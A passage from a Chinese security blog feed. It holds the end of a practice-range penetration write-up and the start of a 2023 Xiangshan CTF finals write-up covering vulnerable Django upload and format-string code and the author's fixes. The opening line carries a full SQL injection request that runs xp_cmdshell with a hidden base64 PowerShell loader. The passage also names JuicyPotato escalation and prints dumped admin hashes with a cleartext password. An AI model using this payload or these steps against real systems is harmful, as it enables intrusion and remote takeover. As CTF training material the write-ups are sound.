l00$cont_form$hf_other1_count=&amp;ctl00$cont_form$hf_other1_num=&amp;ctl00$cont_form$hf_other2_count=&amp;ctl00$cont_form$hf_other2_num=&amp;ctl00$cont_form$hf_roomids=1,2,3,4,5;exec%20master..xp_cmdshell &#x27;powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADIAZwBKAFUARQBqAEMAVABuAGkAagBsAHAANwBCAE4AaABqAGIATABEAFoATABUAEYANABVAGwAYwBzAEYARgBKAFMAMwA4AGcATABtAFQAZgAvADMASwBSAHQASQBwADYAZgBUAE0AeQAzAE4ASQBDAEYAWAAyAFgAYwA1AGQAZQA1AFMAMQAwAEQAUgB2AFIARgBSAEQAQwBQAE4AcwB4AEYAMwB2ADAAQQAwAHgASgA3AEwAMQBXADUAdgAxADcARQBMAG8AMgB5AGQATABkADQAMgBLAEgAcgB6AHEAUQBmAGYAZwBHADEAVABGAEkAYgBjADMANwBjADMARQAwAEMAQgB3AHgAVwAvAEoASQBDACsATwBaADQAZABFADEAVABtADgAawAwAG0AaQBPAHkAWQBvAHQATABOAHoAZQAxAE4ALwBpAHAAMgBRADcAQgBHAGIAeQA2AEkAYwBJAEwAZQBIAEIAUgB0AFAAVAB2AGsAdgBuAEwARgBGADkANwAzAEIAYwA4AEIAMgBIADMAOQA0ADQAOQBlAFQAQwBsAHkAbwAvAFAAKwBvAFkAOABpAFAAZwB5AFIAWQB4AEcATQB3AG0ASwBKACsAeQBlADMAMwBDAEsASwA3AHMAZgBXAEQAcwBHAEkAKwA1AHYANwA4AHYAYgBRAEoANQA0AEYAeQBFAFUAcwA3AFEARwA0AFoAYQBmAGcAWABUAHYANwBwAG4AbwBRAFoAQwBkADQATQBIAHkAQwBvADIATABoAHIANwA4AEsAcABaAGYANwA2AHUAdQBEAEcATQBTAEEAaABNAFcAQwBrAFkAWQBSAGMAaAA1AHMAUQBnAG8AbAA3AGwAcwBwAGMAegBoAEwAZgBWAFEAcwBhAEIAaABTAEwALwBUAFcAMABjAE0AUwB1AC8AWABhAHcAegB4AEgAUAA4AHIAQgBhADIAZgBzAGgAZABMAGwAWgBCAHMAZgBzAEgAUAA4ACsAcABDAFoAMQBiAE4ATwBzAGMAQwBXAEUAOABZAE4AZgArAGEAdwBVAE8AWgBlAE0AbgA4AHYAcgA2AC8AYwBuACsAOQBvADkATgBpAE4AcwBJAE0AZQBaAEQAZABDADEAUABNAE4AUgBCAE0ATQBVAGYAZwB3AEEASwA1AE4AawBJADcAVwBUAEsAMABRAHMAcABpADUAbQAwAEsASgBnAGEAQQBvAGkAcQBuAEwAWABiAEUAdwB2AGMAVABiAG8AKwBJAFgATgB5AGEAawB6AE8AeQArAC8ASwA3AGQAMQArAEkASQBIAGEANwBrAC8AcQA1AFMAOABhAE0AUwBrADUAcABFAHQARgBTACsANQBNAFQAdgAwAEsASABsAGUAWABNADIAeAA0ADcAegBFAC8AbwBQAHkAVgBWAGkAdgA1ADgAUwByAEgAVAA3ADcAYgBOAFUAdABSAEYAQgBHAHgAQwBoAHQANABqAHgAKwB5AEYAWABiADIAOQB1AFgAdgBJAGwAWQB1AGMAcABUAHIAdwBRADUAMwBwAGYAdQBVAHEAWgAwAHgAZwBJAEUASABrADAAegBjAEkANQBvAHoARQBxAHYAWAA2AFAAegA5AG4AdABWAFQATQBzAC8AOQBKAFEAOQBhAHAAMQAwAFQAbQBIADUANAB6AGoASwAvAGUAeQA4AEwARAA5AGUAbgB0AFQAdQByADEAawBUAC8AYgArAHoAWQBvAHgAcwBSAEgATgB2AHYAKwA2AEcAZwBTADAAeABpADQAUwBVAGgAYwA0AEcARgA0AFQAdgB2AGgAWgB6AE4AQwBhAG8ASgB5AFAAaAA2AHYAWQBpAE8ARQBzAEYAaQA0AGYAawBDADEAYwAyAEMAbABrAGgATAA3ADgAcgBDAFkANgBPAEgAcgBYADcAWgA3AEIAOABaAEQARgBQAFcAUwBvAFcARQBxAFUAZgBnAFIAegBqAG0ARwB4AEkATABzAGEAYwBoAGgALwA1AHoAMQBMADAAeQA5AHIAVgBtAGIAbwBLAG4AMABwAHIAZgBUAHEAUABkAHQAbgB1AGQAdwBqAEkAQQB6AEwAMwBDAFIAbQBkAFEANwBMAG4ASQBFAEEAUQBYAGEAWgA0ADkAMABRAFgAegA3AHgAYwBlAFQAbAB5ADgASgAzAHUARgBwAE0ASQBnAHgAQgBHAEYAMwBOAHYAWgBZACsAbwBmAFQAaQB1AHUAZQA1AHIARwBKAGkAeQBLAEwATABhAEoAZwBaAFAAbwBJAFkAawBJAHkAVgBNAGoAZgBBAE4AdQBxAG0AQgB0ADUAYwBJAFIAUQArADUAYQBRAEgAQwBHAEUAbAB4AHkAdwBsAEwAQwBiAHMAVABjAGEARgBFAFcAVQA1AFEAKwAzAHkAdgArAGQASAA2AGMARgBBAGsAZQB6ADQAQgBEAGwATQBPAHUAOQBDAEUAZwBFAGIAMQBuAE0AdQBGAFoAVwBuAEcAOQBnAGcAdQAvAEEAZgBZAEYALwByADUARgB3AFUARwBWAGQAWABrAGoANgBBAFoAZwBsAGcARQBDADgAcQBjAHcAdABNAEkAOQBiAFgAQwB1AFcAZgBFAHUAOQAvAGcALwBkAGoAaQAvAGsAQgBaAG8AKwBpAFMAeQBDAEwAZQBTAEgASwBhADkAYgBRAHoAMQAyAEEAcwBSAFAAaQBFADIAdgBHAEsATwBDAGUAUwBsAGsASgB2AG4AVABUAEsASwB1AGwAMwBBAHoATQByAHAAdQB2ADcAMABUAG4AdABOAEsASQBLAFUAbgBVAGMANwBvAGcAUgBLADIARwBrAGYAZQA0AFkAcQBGAGUAaQB6AGYASAB6AGsAUgB0AHAAZABwAE8AcgBnADEAVAAwAHgAMABkAG8AYgB1AGcAWQBpAEwAMQBRAFcAdAA3AG4ATgBaAGkARAA4ADQAaQBHAGcAeABFAGcAZQAxADEAVwBBAHQARAAwAGkAZQArAHQAVgBVAEQAYwBGAFIAMwB1ADIATwBuADkANQB5AEsARQA3ADYAbQA0AGgAWgB1AFkAagBsAFcAdQB5AGQAWAB3AHQAQgBoAGUAdABPAHgAWgArAG8AZABLAGkAYwBqAHkAUwBOAGgAVwArAGwASgB5AHoAbgBBAHUAeQBEADMARgBUAHUATgBxAGkAMgBDAFYARAAzAEIAMQBwAGEATwBhADgAZwB6AEQANgBOAEEAVABpAGEAOAB2AFUAeABnAHkAMQBFADgAcQBSAFUAeAAzAFUAVQBzAHgAagA0AFYANAAvAEgARQBqAE4AVgBBAGQAVwBUAGMAMgBDAGIAQwBJAGgAbwBtAGMAdgA5AHAAbwBOAFIATQA4AEUAUwBzAE4AcwByADEANwBTAEQAegBaAFEAYQBiAEIARwBUADcAVQB5AGYAYgA0ADYAQwBIAGEATwBiAEgAWgBPAHkAagBlAHIAVwBGAGwAcwBPADIANgBmAG8AWQBMAGUAUABOADYAVABEAEMAMABEADQASgBxAEQAWgBrADcAMgBOAFAAZwAzADUAWQBIADUAMwBnAGUAcgAvAGYAQQBiADgANgBOAC8AWgBWAFoAVABaAGYAUABUAE4AdQBxAGkAQwBnAGsAdABXAGkAaAB1AG0AVABaAE0ASABQADkALwBYAEoAaQB1AGIAWQBFAG8AbABoAEgARwBVADQATQBhAHcATgBUADYAYQAvAFgAOQBtAEwAUQBLAHgAUABMAEgAawArAEkARABTAEkAaAA5AGkAcABQADYAVgB5AGUAcABGAHgAaABxAGwAaABkAE4AbABUAFcAZABsAEsAOABOAFMAMABUADcAVgAwADQARABkAEEAaQAyAEwARwA2AFoASAA1AGEAVwBmADgAdwBuAG0ANABrADUAZABqAEYAegA1AEwAMgBJAEgAYgBtAHEARAB2AFkATQBlAEoAZwB5AGIARAAzAFIAaQBNAGgAcwByAHoAawBRAGIAUgBrAEEAWQBKAEMAWgByAGoAQwBjAHgAdwA1ADMAcQBaAC8ATABSAEIAeABsAFUAbQBIADEAZwA3AFYAUQBGADMATQB0AFoAMgBvAEgATQBLAFYAUQBVAGwAMgBUAHEAZABDAE0AbwB4AGwAWABmAHkAVQA5AHoATgA5AEkAUQBCADYAVgBvAEQAYwBkAGUASgBnAHMANQA2AE8AQgB2ADQAcgBVAGgANABWAEcAZAByADYAUgBrACsARwBpADMAcwBVAHYAWAB4AGUAZQA5ADEATgBHAEUANQBvAGMASABPAGgASQB5AFcAeABxAG4AaQBpADAARwByAE8AMgAzAEgAYwBBAHYAOQB1AGMATwBMAGkAMQBTAE0ARwBzAE8AdABhAHAAawBoAFQAbgB1AG0AegBJAHMAcgBZAGQAcQBFAEMAcABEADEAdQB0AHYAVABGADEAdgArAGEASQB4AHEAYwAzAEcAbABDADgANQBRADEAUABmAFYANQAvADUAMABGAE0AOABrAG8AcwB3AHEAbgBaADcAUQBOAFUAZgBpAFEAVgBPAG4ANABuAEUAOAByAHcAeQBmAGoAYgAwADAAMABiAGMAYgB3AFgASwA3AHcAVwBxAGoAQQBVAEgAWABUAEwANgB1AHMAMwBqAFkAMgBrAEwAaQBCAGUAcwBaAEMAdABLADAAWQB2AFQANQBVAGMAVQBhAFQAQgBmAFMAYwBTAFAAWQBWAFUAbgBSAEsANgB2AFIANABuAEIAWQBNAG4AbABGAHgAZgB1AGQAdgBuAEEAVwBkADIAWgBMAEkAZQA1AEEARAAzAFEAbAA4AFEAWQB5AG0ASwB5AFYAawB6AHMAMABOAHkAWQBaAG4AcwBJACsAdABQAHgAQgAyAGoAcgBCAHgAWAA3AFgAVQAxAGQAYgArAEQAaQB6AHgAagBXAHgAQwBWAHAAcAA1ADMARwBrAGoALwAwAG0ARQBqAGQAVgBDAEIAdABVAFcAegBhAFcAcABvAHAAaABlADQAaQBzAGMARwBKAEwASgBIAEIAUABlADMAYwBjAGEAWgB2AHUAZABGADMAWgBnACsAQQB3ADAAVAAwAGMAYQBnAFoAVwBzAEUAVQBxAHgAOABlAE8AYgBTADYAVAB1ACsARgAyAGcAMwBpACsAbwA5AGIANQBxAGEAMAAwAEQAbgBLAEgAcwBIAG8ASgB3AFEAUQA5AGkAagBGAE4AUgBxADYAegByADYAMwBiAG0AagArAHQAegBBADgATgBaAGEAYQBkAEQAagBYAGsAZABCACsAZgBsAHMAcwA0AFgAcABFAEcAUABTAHoAYwAzAG4AUwB3ADMAeABoAEMAcQA0AGsAOQB6ADAAbgBzAGQAVwB3ADkAagBzAGEAKwAyAEQAZgBYADQAQgBBADQAUwBJAGkAYQBLAHcAagBCAFcAaQBYAGQAZABuAFcAcQBqADMAdQBMADUAbAAyAFUAYQBGADcAMwBlAGQAQgBhAEcARQA5ADkASAB2AEIAdQBMADQAUwAxAGIAVQBlAHMAZABDAGQAagBYADcAZwBiAEQAagBxAFYASgBUACsAUgBWAC8ASgBJAFUANQA1ADIAcABsACsAZgBFAFUAKwBxAG4AbgBNADYAVwBMAEYAYwBaAFQAVwBxAFcAUABJAHAAcQAxAFUARgBtAEgAbgBOAEsAaQB2AFUAcwBBAC8ASAA2AEYAUQBEADcAZQA0AEIAOQB1AFAAZwB5AFAANABWAGwAcABOADMAUwB5AFoANwB5AEcAUwBDAG8ATQBiAHkAVwByAE8AVwB3AFkASABsAE4AVwBnAEoATAB0ACsAeQBkAG8AdgBtAFEAZwBwADYATwBwAFgAagBIAHEAdAA3AHEANABMAHEAVQBSAHUAawA1AGsANQBtAGQAdQBHAGQAbwBDAGEAagBOAHEAeAAzADUAWgBuAEUAVgB3AHkAcABDADAAZQBpAEwAbABxAEMAUABnAFgAeQBTAFQALwBwADQAZgA1AHIAMwBpAHIAWABIAG0AWABUAHoAegBHAGIASwBQADcAQgBzAGUAYwA5AGkAYgBqADMAaABzAGYAYQBIAEcAdQB2ADIAZgB1ADcAdQA3AHcAbAAzAHIAeAAvAGUAdgBsAHkAZgBMADIATwBrAGUALwA3AGUAKwB2AEkAegBOAFcAYgB0AHoAZgBmAHIAdgBOAEMAQQBqADUAMAB6AFYAOQBOAFoAeABxAGcANABSAFkAUQAxAGsAMwBaAGgASABXADkASAB5AFcAUABTAHAAYwA1AGEAZQBMAGgAVABLAE4AWQAvAEgAeQAwADMAeQBQAHEASQBzAEwARwBYAGoAWQBZAFgAMgA4AFYAbgBoAEEAUABaAHAAUABkAEwAMABhAHMAUAA5AC8ANwBQAHIAcwA5ADUAMgB4AFoAcgAzADIANgBLAG4AMgAvAEkARQBxAGwANgA5AFYAbgB4AGUAdAAxAFAAdgA1AGMAagBuAGkAZABBAHIAOQBmAEoAUwB0ADIAdgB2AEkASABJAGwAWABrAGIAcQBKAHQAbQBhAHMAYwA2ADUAVgBLAEoAWABzADIASwBzAHoAYQA3AHgAUABUADgALwB5ADAAKwBHADYAdgBuAE0AMQAvAEgANgBCADgAZABFAFYAeQBWACsAOABEAEcANAAxAGQAQgAvADAAZgBZAC8AQwBEADEALwAvAE8AYgBzAFoAZgBQAGsATgArAFoAeQA5AEgAOQBEAGwAbAAyAGEAWAA4AEwAOQAvAGcAbgBiAEwAagBEAFEAQQBBACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA&#x27;;--<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209586.png" alt="image">​</p><p>CS 上线后 JuicyPotato提权一把梭哈</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209945.png" alt="image">​</p><p>其实在测试的过程当中是发现了如下报错提示的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209679.png" alt="image">​</p><p>但在该windows下并没有发现<code>C:\inetpub</code>​ 这个目录，所以想到其实是站库分离的点，现阶段是拿下了数据库的服务器，但是第二个flag大概率是在web服务器上，所以还是得从后台入手，那么在此去审计下源码中的上传点</p><p>‍</p><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>‍</p><p>有两个点存在上传，一个上传是这个强后缀(直接看aspx发现有两个upload然后最后都是走了<code>helpdesk.m.ajax</code>​这里)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209907.png" alt="image">​</p><p>另一个就是个白名单</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209067.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209396.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209657.png" alt="image">​</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-built_in">string</span> filename = Path.GetFileName(<span class="hljs-keyword">this</span>.f.PostedFile.FileName);<br><span class="hljs-built_in">string</span> ext = Path.GetExtension(<span class="hljs-keyword">this</span>.f.FileName).ToLower();<br><span class="hljs-keyword">if</span> (!Helper.ReadConfigValue(Helper.ReadConfigXml(<span class="hljs-string">&quot;~/app_data/allow_ext.xml&quot;</span>), <span class="hljs-string">&quot;allow_ext&quot;</span>).ToString().Contains(ext))<br>&#123;<br>Helper.Result(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;禁止上传&quot;</span> + ext + <span class="hljs-string">&quot;类型的文件&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进<code>GetExtension</code>​方法，发现是取了最后一个<code>.</code>​来进行获取后缀并且并做了一些空的处理，以及特殊关键字的处理</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209822.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209993.png" alt="image">​</p><p>所以没辙</p><p>这是我当时审计的思路，但是后续看了下wp才发现我竟然漏看了关于<code>cs</code>​层的代码(后悔莫及)，因为我单纯去看了<code>dll</code>​这个思路其实是不对的，因为有可能<code>cs</code>​文件上的处理我直接调用了系统层的代码，那么我直接在项目的<code>dll</code>​下直接搜索<code>upload</code>​找到的方法是不全的，什么意思呢，首先先从项目的<code>cs</code>​文件中找到以下代码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209163.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209390.png" alt="image">​</p><p>确实看了upload2 upload1 但是却漏看了 UserImportData.cs</p><p>查阅一下可以发现 代码逻辑直接写在了cs文件中，这也就是为什么在dll反编译结果里头并没有搜索到的原因</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209578.png" alt="image">​</p><p>所以发现是直接进行后缀名的获取然后任意文件上传到<code>temp</code>​目录下的，那么直接连接shell即可，但是发现这是后台的，所以需要用到刚才的sql的点使用sqlmap去跑一下账号密码(我当时没跑出来 ，太多人跑了卡死了真的)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">查询book库users_users表内的账户和密码字段<br>[*] 6ECE4FD51BC113942692637D9D4B860E    $HEX[310031003100]<br>[*] EFA1DA2B0FDF866CB9A9A989DAB45127  QAZwsx123@<br><br></code></pre></td></tr></table></figure><p>用户名admin密码QAZwsx123@进入后台</p><p>然后上webshell后gsl直接烂土豆提权或者上CS提权都可以</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402011209864.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF - 2023 香山决赛</title>
    <link href="/post/ctf-2023-xiangshan-finals-1eyfve.html"/>
    <url>/post/ctf-2023-xiangshan-finals-1eyfve.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13935">https://xz.aliyun.com/t/13935</a></p><p>现在是24年一月了，浑浑噩噩开摆了好久，偶然想起来自己香山的一道java还没打今天心血来潮来看看(自己好菜)，当时是鹏城+香山双开了，鹏城到是体验了一把坐大牢，不过香山有@xshhcPWN大跌带我还是拿到了总排名第六8k的奖金舒舒服服了(发放奖金也是相当的快啊)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620130.jpg" alt="香山">​</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>‍</p><p>‍</p><h2 id="ezcache-只会Fix"><a href="#ezcache-只会Fix" class="headerlink" title="ezcache(只会Fix)"></a>ezcache(只会Fix)</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620125.png" alt="image">​</p><p>给了两个源码，src应该是源码，packages是依赖</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620281.png" alt="image">​</p><p>这里还是很抽象的，他题目说web根目录在&#x2F;app下，md这源码还有个app…(我写了11个包都是在&#x2F;app下，我人都傻了，全是exp利用成功，求求你了ichunqiu带点脑子写清楚点会死吗)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620423.png" alt="image">​</p><p>当时exp利用成功了11次我就看settings tmd 我还觉得奇怪呢</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620565.png" alt="image">​</p><p>审计urls.py发现定义了三个路由</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620736.png" alt="image">​</p><p>关键代码看<code>generate</code>​ 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_page</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        intro = <span class="hljs-built_in">str</span>(request.POST.get(<span class="hljs-string">&#x27;intro&#x27;</span>))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> intro <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;config.&#x27;</span> <span class="hljs-keyword">in</span> intro:<br>            <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;can&#x27;t be as admin&quot;</span>)<br>        outer_html = (<span class="hljs-string">&#x27;&lt;h1&gt;hello &#123;user&#125;&lt;/h1&gt;&lt;/p&gt;&lt;h3&gt;&#x27;</span> + intro + <span class="hljs-string">&#x27;&lt;/h3&gt;&#x27;</span>).<span class="hljs-built_in">format</span>(user=request.user)<br>        f = request.FILES.get(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-literal">None</span>)<br>        filename = request.POST.get(<span class="hljs-string">&#x27;filename&#x27;</span>) <span class="hljs-keyword">if</span> request.POST.get(<span class="hljs-string">&#x27;filename&#x27;</span>) <span class="hljs-keyword">else</span> f.name<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> filename:<br>            <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;no py&quot;</span>)<br>        <span class="hljs-keyword">if</span> f <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;no file&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/app/static/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename), <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> ff:<br>                <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> f.chunks():<br>                    ff.write(chunk)<br>            <span class="hljs-keyword">return</span> HttpResponse(outer_html + <span class="hljs-string">&quot;&lt;/p&gt;&lt;img src=&#x27;/static/&#123;&#125;&#x27;&gt;&quot;</span>.<span class="hljs-built_in">format</span>(filename))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;unable&quot;</span>)<br></code></pre></td></tr></table></figure><p>发现intro可控并且有render和{}关键字，猜测是SSTI之类的东西进行SSTI的过滤</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620906.png" alt="image">​</p><p>这里就尝试过滤掉<code>&#123;</code>​或者<code>&#125;</code>​符号</p><p>就能过check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render, HttpResponse<br><span class="hljs-keyword">from</span> django.views.decorators.cache <span class="hljs-keyword">import</span> cache_page<br><span class="hljs-comment"># Create your views here.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_page</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        intro = <span class="hljs-built_in">str</span>(request.POST.get(<span class="hljs-string">&#x27;intro&#x27;</span>)).replace(<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> intro <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;config.&#x27;</span> <span class="hljs-keyword">in</span> intro:<br>            <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;can&#x27;t be as admin&quot;</span><br><br>        outer_html = (<span class="hljs-string">&#x27;&lt;h1&gt;hello &#123;user&#125;&lt;/h1&gt;&lt;/p&gt;&lt;h3&gt;&#x27;</span> + intro + <span class="hljs-string">&#x27;&lt;/h3&gt;&#x27;</span>).<span class="hljs-built_in">format</span>(user=request.user)<br>        f = request.FILES.get(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-literal">None</span>)<br>        filename = request.POST.get(<span class="hljs-string">&#x27;filename&#x27;</span>) <span class="hljs-keyword">if</span> request.POST.get(<span class="hljs-string">&#x27;filename&#x27;</span>) <span class="hljs-keyword">else</span> f.name<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> filename:<br>            <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;no py&quot;</span>)<br>        <span class="hljs-keyword">if</span> f <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;no file&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/app/static/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename), <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> ff:<br>                <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> f.chunks():<br>                    ff.write(chunk)<br>            <span class="hljs-keyword">return</span> HttpResponse(outer_html + <span class="hljs-string">&quot;&lt;/p&gt;&lt;img src=&#x27;/static/&#123;&#125;&#x27;&gt;&quot;</span>.<span class="hljs-built_in">format</span>(filename))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;unable&quot;</span>)<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="whatis-只会Fix"><a href="#whatis-只会Fix" class="headerlink" title="whatis(只会Fix)"></a>whatis(只会Fix)</h2><p>一堆python文件</p><p>这个题可以说是把awdp给玩明白了，通过控制变量法，重复修改导入包：硬fuzz 《这就是FUZZ的魅力》</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620062.png" alt="image">​</p><p>啥意思呢，就是他是需要导包的，我们通过不允许他导包来进行测试服务异常，发现在这三个导入的包，只有file会异常，所以异常文件在file目录下的__init__文件</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620203.png" alt="image">​</p><p>发现POST有个读文件，给他加个过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> 